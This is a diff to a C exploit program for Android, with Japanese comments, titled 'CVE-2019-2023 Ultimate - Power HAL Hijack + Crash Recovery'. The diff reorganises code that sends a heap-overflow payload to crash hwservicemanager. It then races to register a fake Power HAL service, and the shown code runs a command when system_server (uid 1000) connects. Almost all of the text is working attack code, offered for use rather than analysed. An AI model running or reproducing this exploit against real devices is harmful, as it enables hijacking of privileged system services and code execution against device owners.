@@ -23,6 +23,18 @@
 #include "binder.h"
 
 // ============================================================
+// プロトタイプ宣言（全関数を前方宣言）
+// ============================================================
+static void dump_hex(FILE *fp, const uint8_t *data, size_t len);
+static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data);
+static int write_file(const char *path, const char *data);
+static int read_file_to_memory(const char *path, uint8_t **out, size_t *out_len);
+static pid_t get_hwservicemanager_pid(void);
+static int overflow_hwservicemanager(void);
+static int exploit_cve_2019_2023(const char *service_name);
+static int binder_server_loop(int binder_fd, int expected_handle);
+
+// ============================================================
 // 設定
 // ============================================================
 #define TARGET_SERVICE "android.hardware.power@1.0::IPower/default"
@@ -38,7 +50,7 @@ static pid_t g_server_pid = -1;
 static pid_t g_hwservicemanager_pid = 0;
 
 // ============================================================
-// ユーティリティ
+// ユーティリティ関数
 // ============================================================
 static void dump_hex(FILE *fp, const uint8_t *data, size_t len) {
     for (size_t i = 0; i < len; i++) {
@@ -87,7 +99,7 @@ static int read_file_to_memory(const char *path, uint8_t **out, size_t *out_len)
 }
 
 // ============================================================
-// hwservicemanager の PID 取得（死活監視用）
+// hwservicemanager PID 取得（死活監視用）
 // ============================================================
 static pid_t get_hwservicemanager_pid(void) {
     FILE *fp = popen("pidof hwservicemanager", "r");
@@ -104,36 +116,7 @@ static pid_t get_hwservicemanager_pid(void) {
 }
 
 // ============================================================
-// オーバーフロー攻撃（hwservicemanager クラッシュ狙い）
-// ============================================================
-static int overflow_hwservicemanager(void) {
-    printf("[*] Attempting heap overflow to crash hwservicemanager...\n");
-    char *payload = malloc(8192);
-    if (!payload) return -1;
-    memset(payload, 'A', 8191);
-    payload[8191] = '\0';
-    // 特定のオフセットにダミーROPチェーン（アドレスはリークできていないのでダミー）
-    int ret = exploit_cve_2019_2023(payload);
-    free(payload);
-    if (ret == 0) {
-        printf("  [+] Overflow payload sent.\n");
-        sleep(2);
-        // クラッシュしたか確認
-        pid_t new_pid = get_hwservicemanager_pid();
-        if (new_pid != g_hwservicemanager_pid) {
-            printf("  [+] hwservicemanager crashed! New PID: %d\n", new_pid);
-            g_hwservicemanager_pid = new_pid;
-            return 0;
-        } else {
-            printf("  [-] hwservicemanager did not crash (still PID %d)\n", g_hwservicemanager_pid);
-            return -1;
-        }
-    }
-    return -1;
-}
-
-// ============================================================
-// CVE-2019-2023 レース付きサービス登録（標準）
+// CVE-2019-2023 エクスプロイト（レース付きサービス登録）
 // ============================================================
 static int exploit_cve_2019_2023(const char *service_name) {
     int hwbinder_fd, ret;
@@ -254,7 +237,34 @@ static int exploit_cve_2019_2023(const char *service_name) {
 }
 
 // ============================================================
-// Binder サーバーループ（トランザクション待ち受け）
+// オーバーフロー攻撃（hwservicemanager クラッシュ狙い）
+// ============================================================
+static int overflow_hwservicemanager(void) {
+    printf("[*] Attempting heap overflow to crash hwservicemanager...\n");
+    char *payload = malloc(8192);
+    if (!payload) return -1;
+    memset(payload, 'A', 8191);
+    payload[8191] = '\0';
+    int ret = exploit_cve_2019_2023(payload);
+    free(payload);
+    if (ret == 0) {
+        printf("  [+] Overflow payload sent.\n");
+        sleep(2);
+        pid_t new_pid = get_hwservicemanager_pid();
+        if (new_pid != g_hwservicemanager_pid) {
+            printf("  [+] hwservicemanager crashed! New PID: %d\n", new_pid);
+            g_hwservicemanager_pid = new_pid;
+            return 0;
+        } else {
+            printf("  [-] hwservicemanager did not crash (still PID %d)\n", g_hwservicemanager_pid);
+            return -1;
+        }
+    }
+    return -1;
+}
+
+// ============================================================
+// Binder サーバーループ（トランザクション待受・system_server 検知）
 // ============================================================
 static int binder_server_loop(int binder_fd, int expected_handle) {
     uint8_t read_buf[4096];
@@ -285,7 +295,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
         uint8_t *payload = read_buf + sizeof(uint32_t);
         size_t payload_size = bwr.read_consumed - sizeof(uint32_t);
 
-        // BR_NOOP (0x720c) は無視（正常）
+        // BR_NOOP (0x720c) は正常なポーリングなので無視
         if (cmd_code == 0x720c) {
             fprintf(stderr, "[SERVER] BR_NOOP ignored.\n");
             continue;
@@ -306,12 +316,11 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
             log_transaction("Incoming transaction", t, data_ptr);
             if (data_ptr) free(data_ptr);
 
-            // 呼び出し元が system_server (uid=1000) かチェック
+            // 呼び出し元が system_server (uid=1000) ならコマンド実行
             if (t->sender_euid == 1000) {
                 printf("[SERVER] Received transaction from system_server (uid=1000)! Executing id...\n");
                 pid_t pid = fork();
                 if (pid == 0) {
-                    // 子プロセスでコマンド実行
                     int fd = open(OUTPUT_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                     if (fd >= 0) {
                         dup2(fd, STDOUT_FILENO);
@@ -363,14 +372,13 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
 }
 
 // ============================================================
-// メイン（再起動監視 + 乗っ取り + サーバー起動）
+// メイン（オーバーフロー → 再起動監視 → 乗っ取り → サーバー起動）
 // ============================================================
 int main(void) {
     printf("============================================================\n");
     printf("  CVE-2019-2023 Ultimate - Power HAL Hijack + Crash Recovery\n");
     printf("============================================================\n\n");
 
-    // ログ初期化
     FILE *fp = fopen(LOG_FILE, "w");
     if (fp) {
         fprintf(fp, "=== Binder Traffic Log ===\n");
@@ -378,7 +386,6 @@ int main(void) {
         printf("[+] Log file created: %s\n", LOG_FILE);
     }
 
-    // 現在の hwservicemanager PID を取得
     g_hwservicemanager_pid = get_hwservicemanager_pid();
     if (g_hwservicemanager_pid <= 0) {
         printf("[-] Could not find hwservicemanager. Exiting.\n");
@@ -412,7 +419,7 @@ int main(void) {
         sleep(1);
     }
 
-    // 3. 再起動直後に Power HAL を登録（system_server が再接続する前に）
+    // 3. Power HAL を乗っ取る（再起動直後が狙い目）
     printf("[*] Hijacking Power HAL service...\n");
     if (exploit_cve_2019_2023(TARGET_SERVICE) != 0) {
         printf("[-] Failed to register Power HAL. Retrying once...\n");
